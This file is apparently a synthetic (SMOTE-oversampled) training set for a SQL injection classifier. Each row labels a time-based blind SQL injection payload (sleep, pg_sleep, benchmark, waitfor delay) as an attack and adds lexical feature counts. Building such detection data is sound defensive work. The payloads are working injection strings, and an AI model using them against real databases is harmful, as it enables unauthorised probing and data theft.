id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000089,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000024,1.1508251637082922,76.16722057847376,18.0,2.6937361211839894,17.370862736421113,3.629137263578883,42.77814705231584,12.389073526157919,0.22644929439796463,0.04993278807175873,0.5613782542972483,0.16223966323302838,3.1854313682105575,0.0,0.0,0.0,0.0,1.0,0.0,7.79635784205264,0.0,0.0,0.20364215794736068,1.0,0.7963578420526393,0.0,0.0,0.2036421579473607,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7963578420526396,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7963578420526396
SMOTE_000090,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,1.2580821587113455,74.24155020831964,24.0,3.5256867251127058,17.0,19.0,29.14010017155735,9.101450036762289,0.2316424993872952,0.2588945581387417,0.38749647174156204,0.12196647073240113,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.101450036762289,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000091,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,1.8934782569340698,85.8016593143854,26.800474089824398,3.3898080314630055,22.001185224561,13.201896359297596,39.399051820351204,11.1995259101756,0.2556981509171158,0.1523080059809701,0.46081034393565573,0.13118349916625838,0.5997629550878005,0.0,2.0,0.0,0.0,1.4002370449121997,0.0,6.199525910175601,0.0,1.0,0.0,3.4002370449121995,0.5997629550878003,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.40023704491219964,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4002370449121995
SMOTE_000092,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,0.8654077541316618,87.45071021854525,27.267613624726998,3.7832151451655385,21.084517030908746,25.53522724945399,31.464772750546008,9.366193187636503,0.24084517030908745,0.29156829171807885,0.3603447453865897,0.107241792586244,0.0,1.0,0.0,0.0,0.0,1.816903406181749,0.0,4.549289781454753,0.0,0.0,1.0,1.8169034061817488,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.816903406181749,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.816903406181749
SMOTE_000093,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,1.243383479343556,64.47379094454733,23.94758188909467,3.4324335651577034,18.473790944547336,10.0,28.0,8.0,0.28648903448297536,0.15511107946022276,0.4343110224886237,0.1240888635681782,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.47379094454733583,0.5262090554526642,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000094,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,1.1640295966637277,87.26116959351741,27.014892791356555,3.7458484124428733,20.76861598919569,25.029785582713107,31.970214417286893,9.492553604321722,0.2376861598919569,0.2863060898735004,0.367051307609054,0.10895644262548863,0.0,1.0,0.0,0.0,0.0,1.7537231978391385,0.0,4.738830406482585,0.0,0.0,1.0,1.7537231978391383,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7537231978391383,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7537231978391383
SMOTE_000095,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.6413653969742119,89.74296808476066,28.0,3.881829528891572,25.257031915239338,22.990624113014213,30.495312056507107,11.0,0.2820294110292754,0.2556854226130728,0.33965626617224276,0.12262890018540895,3.628515957619669,0.0,0.2476560282535537,0.0,0.0,2.0,0.0,4.123828014126777,0.0,0.0,1.0,2.247656028253554,1.0,0.0,0.12382801412677685,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.12382801412677691,0.0,1.8761719858732233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000096,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000031,0.5048783509547946,94.34025655865226,25.240073302472073,3.194680138975012,24.77202199074162,9.316065972224866,46.63213194444973,13.620036651236036,0.26511136001590135,0.0964841758761705,0.49401138739546324,0.1443930767124649,0.0,3.9240073302472074,0.0,0.0,0.0,1.0,0.0,7.772021990741623,0.0,0.0,0.9240073302472074,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.07599266975279262,0.0,0.0,0.0,1.0,0.9240073302472074,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000097,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.150733911067327,77.31175104056425,23.758821577223465,3.54859666916535,18.264702628705773,21.023524205929238,29.51764315444693,8.50588105148231,0.2362244357194181,0.2705750407790001,0.3829960092569265,0.11020451424465535,0.2529405257411548,0.0,0.0,0.0,0.0,1.2529405257411548,0.0,5.0,0.0,0.0,1.0,1.2529405257411548,0.25294052574115483,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.25294052574115483,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2529405257411548
SMOTE_000098,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,1.9592289068646558,81.49498323819073,26.0,3.5911740073731293,19.468227406207397,22.11705685155185,31.909698980431475,8.0,0.23631205129120975,0.273101349143216,0.3913294001126289,0.09925719945294541,0.4414715742240751,0.0,0.0,0.0,0.0,1.0,0.0,5.558528425775925,0.0,0.0,1.0,1.0,0.44147157422407507,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.558528425775925,0.0,0.0,0.0,0.5585284257759249,0.4414715742240751,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5585284257759247
SMOTE_000099,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000019,2.656877612371204,60.56103632935843,25.780518164679215,4.074216627300036,25.22441453174337,8.448829063486745,15.33168910119247,11.556103632935843,0.41662628354423537,0.13494865823058386,0.25698049873188605,0.19144455949329472,5.443896367064157,0.0,1.1122072658716862,0.0,0.0,1.0,0.0,1.443896367064157,0.0,0.0,0.0,2.6683108988075293,1.0,0.0,0.5561036329358431,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5561036329358431,0.0,0.5561036329358431,0.0,0.4438963670641569,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.556103632935843
SMOTE_000100,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000017,1.4857502554173205,82.6198204242272,24.619820424227203,3.214836901265185,30.0,2.0,39.0,11.619820424227203,0.36312156733370315,0.024208104488913543,0.47205803753381415,0.14061229064356912,0.38017957577279626,0.6198204242272037,0.0,0.0,1.0,0.0,0.0,8.0,0.6198204242272037,0.0,0.0,1.0,0.3801795757727962,0.6198204242272037,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000101,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,1.806870539875294,93.8805591281511,28.0,3.623155247291965,27.425349455094434,18.0,37.970139782037776,10.485069891018886,0.29152692434860794,0.19208049157520185,0.4047315071022459,0.11166107697394431,0.0,0.4850698910188872,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.4850698910188872,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5149301089811128,0.48506989101888714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000102,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000042,1.1980936849164303,90.61733052829632,23.676294737942403,3.3098868085216577,37.352589475884805,1.2647410524115195,40.52948210482304,11.470517895176961,0.41079078342619485,0.014209368579873899,0.4486109337706976,0.12638891422323367,2.205776842765442,0.0,0.0,0.0,1.0,0.0,0.0,8.26474105241152,0.0,0.0,0.0,1.0,0.7352589475884806,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7352589475884806,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.7352589475884805
SMOTE_000103,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000001,2.083602939381869,64.97579876007924,26.562785271456875,4.085871158941382,31.550684651496496,3.2874429457086256,17.0,13.137671162874124,0.48164539772081283,0.051885682997011184,0.26440353651611403,0.20206538276606195,4.57488589141725,0.0,1.4251141085827492,0.0,0.0,0.2874429457086255,0.0,2.0,0.0,0.7125570542913746,0.7125570542913746,3.137671162874124,1.0,0.0,0.7125570542913746,0.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,0.0,0.7125570542913746,0.0,0.0,0.0,0.2874429457086254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000104,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.34775367647774813,85.0,27.902712446648767,3.687354022418025,24.902712446648767,18.0,33.0,9.097287553351233,0.2929730876076326,0.21176470588235294,0.38823529411764707,0.10702691239236745,0.0,0.09728755335123318,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.0,0.09728755335123315,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9027124466487668,0.09728755335123318,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000105,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,1.9504065503102845,57.115844666430974,20.48779288857464,3.362464231427687,21.628051777856342,4.347533999292934,23.88415533356902,7.256103555712681,0.3791229772695138,0.07425728186863599,0.41907281538108077,0.12754692548076946,2.256103555712681,0.0,0.0,0.0,0.0,1.0,0.0,3.6280517778563404,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.37194822214365947,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6280517778563405,0.0,0.3719482221436594,0.0,0.6280517778563406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6280517778563404
SMOTE_000106,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,1.8339600129419762,91.36112278096925,28.0,3.661598358977856,27.44658568498817,18.0,35.935902821985806,9.978634273995269,0.29999180236491757,0.19801918246609285,0.39299335991558326,0.10899565525340632,0.0,0.4893171369976348,2.0,0.0,0.0,2.0,0.0,4.489317136997635,0.0,1.0,0.0,4.0,0.0,0.4893171369976348,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5106828630023652,0.4893171369976348,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000107,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000019,1.3540264895740894,63.80276657200923,26.403688762678982,4.127978595662332,26.20184438133949,10.204149858013853,15.596311237321022,11.800461095334873,0.41028557688209066,0.15792347898482129,0.24681134248180886,0.18497960165127925,5.0,0.0,1.600922190669745,0.0,0.0,1.0,0.0,1.3990778093302554,0.0,0.0,0.0,3.4013832860046174,1.0,0.0,0.8004610953348725,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8004610953348725,0.0,0.8004610953348724,0.0,0.19953890466512741,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8004610953348728
SMOTE_000108,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,0.7585919245981639,86.87016592641817,19.662345983019577,2.874211006406965,27.22078199433986,2.0,45.20781994339858,12.441563988679718,0.31419381535484264,0.023105015727437853,0.5195188684842292,0.1431823004334902,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.441563988679716,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.2207819943398585,0.7792180056601415,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000109,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,2.4502121361685365,72.93816657973058,24.876333159461154,3.656518080854062,17.938166579730577,20.407249869595866,26.592750130404134,8.0,0.24579563849196354,0.2795602150142683,0.3649416939107811,0.10970245258298712,0.0,0.0,0.9381665797305769,0.0,0.0,1.0,0.0,4.530916710134711,0.0,0.0,1.0,1.9381665797305772,0.0,0.0,0.46908328986528847,0.5309167101347114,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.4690832898652886,0.5309167101347114,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.7367643751652081,75.26464934762573,22.433837663093566,3.3212879858010407,15.578450217458087,16.843099565083822,33.13232467381287,9.710774891270956,0.20890528002595143,0.22220878686397424,0.4399981862266365,0.1288877468834378,0.14461255436452203,0.0,2.0,0.0,0.0,1.855387445635478,0.0,4.855387445635478,0.0,0.0,0.855387445635478,3.855387445635478,0.1446125543645222,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.14461255436452214,0.8553874456354779,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000111,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.0661845277234747,84.14396791412699,27.023994652354496,3.7056499115584107,24.0239946523545,18.0,33.09597860941799,9.023994652354498,0.2855238519654405,0.21394293353779287,0.3932951404794869,0.10723807401727975,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.023994652354498,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.023994652354498047,0.9760053476455018,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,0.8862004592840588,56.82645287658677,18.17354712341323,2.946628512300322,17.04128274047938,1.0,28.305811506347077,10.47935862976031,0.3001659994304312,0.017598229048688366,0.4979524193110173,0.18428335220986314,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.826452876586769,0.8264528765867697,0.8264528765867696,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17354712341323036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1735471234132304
SMOTE_000113,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,2.304515749029024,88.0,27.527004155946102,3.87527420492788,21.054008311892204,27.945991688107796,30.0,9.0,0.23925009445332052,0.3175680873648613,0.3409090909090909,0.10227272727272728,0.0,0.5270041559461022,0.9459916881077958,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.945991688107796,0.0,0.5270041559461022,0.4729958440538979,0.5270041559461022,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,0.04250109233107893,62.817916333375926,19.0,3.181855015250514,26.0,1.0,27.817916333375926,8.0,0.4139104391531556,0.015919632275121373,0.442812870370752,0.12735705820097096,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000115,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,1.045307830597966,81.84264418434151,19.0,2.908948492384716,27.0,2.0,41.65165261521344,11.190991569128066,0.3305527266639692,0.024485387160294025,0.5086944109886034,0.13626747518713336,0.0,0.7303305230426886,0.0,0.0,1.0,0.0,0.0,8.730330523042689,0.0,0.0,0.0,1.0,0.0,0.7303305230426886,0.0,0.7303305230426886,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000116,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,2.4460254289813697,60.238069165816974,17.76193083418303,3.0960857784044675,23.17462055612202,1.0,27.06344860969495,9.0,0.385344164251392,0.016610697330285126,0.44854886244575665,0.14949627597256623,1.7619308341830289,1.2380691658169711,0.0,0.0,0.0,1.0,0.0,4.412689721938991,0.0,0.5873102780610095,0.0,1.0,0.5873102780610095,0.4126897219389903,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4126897219389903,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4126897219389902
SMOTE_000117,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000024,0.06631268080662446,77.89439184977778,18.0,2.692950375938437,18.90612608869135,2.0938739113086484,43.92959456651851,12.964797283259257,0.24260207911039536,0.027040762055466183,0.563945584317767,0.16641157451637142,3.9530630443456762,0.0,0.0,0.0,0.0,1.0,0.0,7.988265761086419,0.0,0.0,0.011734238913581219,1.0,0.9882657610864186,0.0,0.0,0.011734238913581302,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.988265761086419,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.988265761086419
SMOTE_000118,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,1.3867450137995754,66.07411651033645,24.84446990620187,3.563492852372576,21.45929320826916,10.0,27.61482330206729,7.0,0.324119341368946,0.15155434988250127,0.4182382638308018,0.1060880449177509,0.0,0.3851766979327099,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.3851766979327099,0.0,0.6148233020672901,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000119,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000055,2.5383177079791834,65.8478143356518,16.23043713286964,2.5789732211311516,13.05072855478273,1.589854289043453,37.84781433565181,13.359417156173816,0.20524524811213124,0.023580380151029492,0.5691371348436284,0.2020372368932109,3.589854289043454,0.0,0.0,0.0,0.0,1.0,0.0,6.769562867130362,1.589854289043454,0.41014571095654606,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.410145710956546,0.0,0.0,0.0,1.5898542890434542,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.589854289043454
